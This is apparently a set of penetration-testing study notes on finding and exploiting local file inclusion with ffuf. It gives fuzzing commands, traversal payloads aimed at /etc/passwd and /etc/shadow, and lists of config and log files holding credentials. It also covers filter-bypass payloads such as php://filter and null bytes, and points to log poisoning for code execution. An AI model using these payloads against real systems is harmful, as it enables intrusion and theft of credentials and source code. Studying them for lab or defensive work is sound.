
## 1. Parameter Name Fuzzing

Goal: Discover hidden or undocumented GET parameters.

```bash
ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ \
-u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' \
-fs 2287
```

### What This Does

- Uses a parameter name wordlist
- Replaces `FUZZ` with each candidate parameter
- `-fs 2287` filters responses with size 2287 bytes to remove baseline noise
### Why It Matters

Sometimes LFI is not in `page=` or `file=`.  
It might be hidden under something like:

- `language=`
- `template=`
- `view=`
- `include=`

Parameter fuzzing finds the injection point first.

---
## 2. LFI Wordlist Fuzzing

Once a vulnerable parameter is identified:

```bash
ffuf -w /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ \
-u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' \
-fs 2287
```

### Goal

Inject known traversal payloads like:

```
../../../../etc/passwd
../../../../windows/win.ini
```

Look for:

- Response size changes
- 200 status codes
- Sensitive file content in output
---
## 3. Enumerating Server Webroot

If traversal works but `/etc/passwd` is filtered, try targeting webroot directories:

```bash
ffuf -w /opt/useful/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ \
-u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' \
-fs 2287
```

### Purpose

Discover where the actual webroot is located:

Common paths:

- `/var/www/html`
- `/srv/http`
- `/usr/share/nginx/html`
- `/var/www/public`

If you locate the correct webroot, you can:

- Read source code
- Find credentials
- Identify file upload paths
---

## 4. Server Logs and Configuration Files

Once LFI is confirmed, enumerate high-value targets:

```bash
ffuf -w ./LFI-WordList-Linux:FUZZ \
-u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' \
-fs 2287
```

### High-Value Files to Target

#### System Files

- `/etc/passwd`
- `/etc/shadow`
- `/etc/hosts`
#### Web Config Files

- `/etc/apache2/apache2.conf`
- `/etc/nginx/nginx.conf`
- `/var/www/html/config.php`
- `.env`
#### Log Files

- `/var/log/apache2/access.log`
- `/var/log/apache2/error.log`
- `/var/log/nginx/access.log`
- `/var/log/nginx/error.log`

Log files are especially useful for:

- Log poisoning
- RCE via PHP injection in User-Agent
---
## Important Filtering Techniques

Instead of only using `-fs`, also consider:

- `-fc 404` → filter status code
- `-fw` → filter by word count
- `-fl` → filter by line count    

Sometimes response size stays similar but word count changes.

---
## Advanced LFI Considerations

If traversal is blocked:

- Try double URL encoding
 ``` 
 %252e%252e%252f
 ```
- Use PHP wrappers
```
php://filter/convert.base64-encode/resource=index.php
```
- Null byte injection (older PHP)
```
file.php%00
```
